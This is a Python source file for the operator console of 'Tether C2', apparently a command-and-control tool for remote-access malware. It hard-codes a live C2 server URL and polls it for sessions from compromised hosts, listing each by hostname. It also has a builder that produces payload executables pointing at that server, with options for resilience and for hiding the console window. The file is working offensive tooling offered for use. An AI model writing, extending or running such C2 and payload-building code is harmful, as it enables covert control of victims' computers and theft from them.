import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests # We need the requests library now
import threading # To run polling in the background
import time

from .session_view import SessionViewWindow
from ..builder import build_payload

# The URL of YOUR Render server. The GUI will poll this address.
C2_SERVER_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com"

class App(ctk.CTk):
    def __init__(self): # No longer needs data_queue
        super().__init__()

        self.sessions = {}  # Still used to store data locally in the GUI
        self.session_buttons = {}

        # --- Window Setup ---
        self.title("Tether C2")
        self.geometry("800x500")
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(2, weight=1)

        # --- Builder Frame (This part remains the same) ---
        builder_frame = ctk.CTkFrame(self, corner_radius=0)
        builder_frame.grid(row=0, column=0, columnspan=2, sticky="ew", padx=10, pady=10)
        builder_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(builder_frame, text="Payload Name:").grid(row=0, column=0, padx=(10, 5), pady=10, sticky="w")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="my_payload")
        self.payload_name_entry.grid(row=0, column=1, columnspan=2, sticky="ew", padx=5, pady=10)
        self.resilience_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(builder_frame, text="Enable Resilience", variable=self.resilience_var).grid(row=1, column=0, padx=(10, 5), pady=5, sticky="w")
        self.debug_mode_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(builder_frame, text="Debug Mode (Show Console)", variable=self.debug_mode_var).grid(row=1, column=1, padx=5, pady=5, sticky="w")
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.grid(row=0, column=3, rowspan=2, padx=(5, 10), pady=10, sticky="ns")

        # --- Sessions Header ---
        sessions_label_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        sessions_label_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=(10, 0), sticky="ew")
        self.sessions_label = ctk.CTkLabel(sessions_label_frame, text="Active Sessions", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.pack()
        
        # --- Sessions Frame ---
        self.sessions_frame = ctk.CTkScrollableFrame(self, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, columnspan=2, padx=10, pady=(0, 10), sticky="nsew")

        # --- MODIFICATION: Start a polling thread instead of a queue processor ---
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
        self.poll_thread.start()
        
        # Make sure polling stops when window is closed
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def on_closing(self):
        self.polling_active = False # Signal the polling thread to stop
        self.destroy()

    def poll_for_sessions(self):
        """Periodically asks the Render server for the list of sessions."""
        while self.polling_active:
            try:
                # Make a GET request to our new endpoint
                response = requests.get(C2_SERVER_URL + "/api/get_sessions", timeout=10)
                response.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
                
                server_sessions = response.json()
                
                # We need to use 'after' to schedule GUI updates from this background thread
                self.after(0, self.update_gui_with_sessions, server_sessions)

            except requests.exceptions.RequestException as e:
                # This will happen if the server is down or network fails
                self.after(0, self.update_sessions_label, f"Error Connecting: {e.__class__.__name__}")
            
            time.sleep(5) # Wait 5 seconds before polling again

    def update_sessions_label(self, text):
        """Safely updates the session label from any thread."""
        self.sessions_label.configure(text=text)

    def update_gui_with_sessions(self, server_sessions):
        """This function runs in the main GUI thread to safely update the UI."""
        self.update_sessions_label(f"Active Sessions ({len(server_sessions)})")
        
        current_session_ids = {s["session_id"] for s in server_sessions}
        
        # Add new buttons
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.session_buttons:
                self.sessions[sid] = session_data # Store data locally
                self.add_session_button(sid, session_data["hostname"])

        # Update existing buttons (e.g., color for last_seen)
        for session_data in server_sessions:
            sid = session_data["session_id"]
            button = self.session_buttons.get(sid)
            if button:
                # If last seen within 45 seconds, green, otherwise orange
                is_active = (time.time() - session_data.get("last_seen", 0)) < 45
                button.configure(fg_color="green" if is_active else "orange")
                
        # Remove old/dead buttons
        for sid, button in list(self.session_buttons.items()):
            if sid not in current_session_ids:
                button.destroy()
                del self.session_buttons[sid]
                del self.sessions[sid]

    def build_payload_handler(self): # This method is mostly the same
        payload_name = self.payload_name_entry.get()
        if not payload_name or not payload_name.isalnum():
            messagebox.showerror("Error", "Payload Name must be alphanumeric.")
            return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return

        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()

        success = build_payload(
            payload_name=payload_name, c2_url=C2_SERVER_URL,
            resilience_enabled=self.resilience_var.get(),
            output_dir=output_dir, debug_mode=self.debug_mode_var.get()
        )

        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: messagebox.showerror("Build Failed", "Error during build. Check console.")
        self.build_button.configure(state="normal", text="Build Payload")

    def add_session_button(self, session_id, hostname):
        button_text = f"  {hostname}  |  {session_id[:8]}...  "
        button = ctk.CTkButton(
            self.sessions_frame, text=button_text,
            command=lambda sid=session_id: self.show_session_data(sid)
        )
        button.pack(fill="x", padx=5, pady=3)
        self.session_buttons[session_id] = button

    def show_session_data(self, session_id):
        session_data = self.sessions.get(session_id)
        if session_data:
            SessionViewWindow(self, session_data)